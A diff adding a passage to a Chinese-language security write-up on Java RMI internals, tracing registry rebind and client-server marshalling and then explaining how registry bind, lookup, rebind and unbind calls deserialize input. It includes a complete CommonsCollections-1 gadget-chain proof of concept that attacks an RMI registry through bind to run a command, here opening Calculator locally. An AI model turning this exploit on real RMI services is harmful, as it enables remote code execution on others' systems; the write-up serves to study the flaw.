@@ -215,11 +215,322 @@ public class RMIClient {
 
 <img src="./images/24.png" alt="">
 
+接着来看看远程调用`rebind`方法，`Server`端测试代码
+
+```java
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.server.UnicastRemoteObject;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2021/12/16 5:33 下午
+ */
+public class RMIServer extends UnicastRemoteObject implements RMI.Interface.DemoInterface {
+    public RMIServer() throws RemoteException {
+        super();
+    }
+
+    public String ctf() throws RemoteException {
+        System.out.println("Ctfer is so cool!");
+        return "Hello World!";
+    }
+
+    public void start() throws Exception {
+        RMIServer rmiServer = new RMIServer();
+        LocateRegistry.getRegistry(7777);
+        Naming.rebind("rmi://127.0.0.1:7777/h3rmesk1t", rmiServer);
+        System.out.println("RMI服务在7777端口已启动.");
+    }
+
+    public static void main(String[] args) throws Exception {
+        new RMIServer().start();
+    }
+}
+```
+
+这里先创建了注册中心，之后通过`getRegistry`的方式远程获取注册中心，此时获得到的对象为`RegistryImpl_Stub`，跟入其`rebind`方法
+
+<img src="./images/25.png" alt="">
+
+<img src="./images/26.png" alt="">
+
+跟进`rebind`调用的`UnicastRef#newCall`，这里的`var3`就是上文提到的对应关系
+
+<img src="./images/27.png" alt="">
+
+跟进`StreamRemoteCall`方法，这里在最开始写入了`80`，还会写一些数据比如要调用的方法所对应的`num`和`ObjID`之类的
+
+<img src="./images/28.png" alt="">
+
+当调用完这些之后，回到`rebind`方法，此时会往写入两个内容
+> * 序列化后的var1，var1为我们要绑定远程对象对应的名称
+> * 序列化后的var2，var2为我们要绑定的远程对象
+
+<img src="./images/29.png" alt="">
+
+在`invoke`这里会把请求发出去，接着看看注册中心在收到这条请求后是如何进行处理的，由于上文分析了会调用`Skel#dispatch`来处理请求，因此直接跟着这往后看，注册中心首先会`read`两个`Object`，第一个是刚刚`write`进去的字符串对象，第二个就是远程对象了，接着调用`var6.rebind`来绑定服务
+
+<img src="./images/30.png" alt="">
+
+## 客户端与服务端通信
+客户端与服务端的通信只发生在调用远程方法时，此时是客户端的远程代理对象与的`Skel`进行通信，将断点下在`Client`端利用接口调用方法处
+
+<img src="./images/31.png" alt="">
+
+跟进断点，在客户端获取的是注册中心封装好的代理对象，所以默认会调用代理对象的`invoke`方法
+
+<img src="./images/32.png" alt="">
+
+这里会判断调用的方法是所有对象都有的还是只有远程对象才有的，如果是所有对象都有的则进入`invokeObjectMethod`中，否则则进入`invokeRemoteMethod`中
+
+跟进`RemoteObjectInvocationHandle#invokeRemoteMethod`，跟进调用的`ref.invoke`，并把`proxy`、`method`、`args`以及`method`的`hash`传过去，`ref`是在`lookup`时获取到的远程对象绑定的一些端口信息，需要注意的是这里的端口是随机的，每次都会变
+
+<img src="./images/33.png" alt="">
+
+<img src="./images/34.png" alt="">
+
+跟进`invoke`方法，在`newConnection`这里会发送一些约定好了的数据
+
+<img src="./images/35.png" alt="">
+
+跟进`for`循环，在`marshaValue`里会将调用的方法要传递的参数序列化写到连接中，如果传递的参数是对象，就会将序列化对象写入到里面
+
+<img src="./images/36.png" alt="">
+
+接着调用`StreamRemoteCall#executeCall`
+
+<img src="./images/37.png" alt="">
+
+跟进`executeCall`方法，在`this.releaseOutputStream`方法中会读取服务端执行的结果
+
+<img src="./images/38.png" alt="">
+
+跟进`StreamRemoteCall#releaseOutputStream`，在`this.out.flush`时会把之前写进去的数据发出去，服务端会返回执行结果
+
+<img src="./images/39.png" alt="">
+
+结束调用`executeCall`后，会调用`unmarsharValue`方法把数据取出来
+
+<img src="./images/40.png" alt="">
+
+跟进`UnicastRef#unmarsharValue`，这里对传入的参数做一个判断，当其数据类型是`Object`时，则会调用`JDK`自带的`readObject`来进行反序列化
+
+<img src="./images/41.png" alt="">
+
+当`Client`在与`Server`通信时，`Server`实际处理请求的位置在`UnicastServerRef#dispatch`，调用`unmarshaValue`对请求传来的参数进行处理
+
+<img src="./images/42.png" alt="">
+
+在这里会判断参数的数据类型，如果是`Object`的话则会反序列化，因此如果可以找到`Server`注册的远程对象中某个方法传递的参数类型是`Object`时，即可在`Server`端进行反序列化从而来达到`RCE`的目的
+
+结束`unmarshaValue`后，最终通过调用`invoke`来调用远程对象的方法
+
+<img src="./images/43.png" alt="">
+
+# RMI反序列化攻击方式
+后续漏洞利用演示均利用`CommonsCollections-1`链
+
+## 攻击注册中心
+与注册中心进行交互的方式有
+> * bind
+> * list
+> * lookup
+> * rebind
+> * unbind
+
+在注册中心的处理中，如果存在`readObject`，则可以利用
+
+### bind
+```java
+case 0:
+    try {
+        var11 = var2.getInputStream();
+        var7 = (String)var11.readObject();
+        var8 = (Remote)var11.readObject();
+    } catch (IOException var94) {
+        throw new UnmarshalException("error unmarshalling arguments", var94);
+    } catch (ClassNotFoundException var95) {
+        throw new UnmarshalException("error unmarshalling arguments", var95);
+    } finally {
+        var2.releaseInputStream();
+    }
+
+    var6.bind(var7, var8);
+
+    try {
+        var2.getResultStream(true);
+        break;
+    } catch (IOException var93) {
+        throw new MarshalException("error marshalling return", var93);
+    }
+```
+当调用`bind`时，会利用`readObject`读取参数名及远程对象，因此可以利用
+
+POC:
+```java
+package RegistryAttack;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.rmi.AlreadyBoundException;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2021/12/17 2:36 上午
+ */
+public class BindAttack {
+
+    public static void bindAttack() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, AlreadyBoundException, RemoteException {
+        Transformer[] transformer = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
+
+        HashMap innermap = new HashMap();
+        Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
+        Constructor[] constructors = clazz.getDeclaredConstructors();
+        Constructor constructor = constructors[0];
+        constructor.setAccessible(true);
+        Map map = (Map)constructor.newInstance(innermap,chainedTransformer);
 
 
+        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
+        handler_constructor.setAccessible(true);
+        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
 
+        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
 
-# RMI反序列化攻击
+        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
+        AnnotationInvocationHandler_Constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
+
+        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 8888);
+        Remote remote = Remote.class.cast(Proxy.newProxyInstance(
+                Remote.class.getClassLoader(),
+                new Class[] { Remote.class }, handler));
+        registry.bind("user", remote);
+    }
+
+    public static void main(String[] args) {
+        try {
+            bindAttack();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+### list
+```java
+case 1:
+    var2.releaseInputStream();
+    String[] var97 = var6.list();
+
+    try {
+        ObjectOutput var98 = var2.getResultStream(true);
+        var98.writeObject(var97);
+        break;
+    } catch (IOException var92) {
+        throw new MarshalException("error marshalling return", var92);
+    }
+```
+
+当调用`list`时，不存在`readObject`，因此无法攻击注册中心
+
+### lookup
+```java
+case 2:
+    try {
+        var10 = var2.getInputStream();
+        var7 = (String)var10.readObject();
+    } catch (IOException var89) {
+        throw new UnmarshalException("error unmarshalling arguments", var89);
+    } catch (ClassNotFoundException var90) {
+        throw new UnmarshalException("error unmarshalling arguments", var90);
+    } finally {
+        var2.releaseInputStream();
+    }
+
+    var8 = var6.lookup(var7);
+
+    try {
+        ObjectOutput var9 = var2.getResultStream(true);
+        var9.writeObject(var8);
+        break;
+    } catch (IOException var88) {
+        throw new MarshalException("error marshalling return", var88);
+    }
+```
+当调用`lookup`时，会利用`readObject`读取参数参数名，因此可以利用
+
+### rebind
+```java
+case 3:
+    try {
+        var11 = var2.getInputStream();
+        var7 = (String)var11.readObject();
+        var8 = (Remote)var11.readObject();
+    } catch (IOException var85) {
+        throw new UnmarshalException("error unmarshalling arguments", var85);
+    } catch (ClassNotFoundException var86) {
+        throw new UnmarshalException("error unmarshalling arguments", var86);
+    } finally {
+        var2.releaseInputStream();
+    }
+
+    var6.rebind(var7, var8);
+
+    try {
+        var2.getResultStream(true);
+        break;
+    } catch (IOException var84) {
+        throw new MarshalException("error marshalling return", var84);
+    }
+```
+当调用`rebind`时，会利用`readObject`读取参数名及远程对象，因此可以利用
+
+### unbind
+```java
+case 4:
+    try {
+        var10 = var2.getInputStream();
+        var7 = (String)var10.readObject();
+    } catch (IOException var81) {
+        throw new UnmarshalException("error unmarshalling arguments", var81);
+    } catch (ClassNotFoundException var82) {
+        throw new UnmarshalException("error unmarshalling arguments", var82);
+    } finally {
+        var2.releaseInputStream();
+    }
+
+    var6.unbind(var7);
+
+    try {
+        var2.getResultStream(true);
+        break;
+    } catch (IOException var80) {
+        throw new MarshalException("error marshalling return", var80);
+    }
+```
+当调用`unbind`时，会利用`readObject`读取参数参数名，因此可以利用
 
 
 # 参考文章
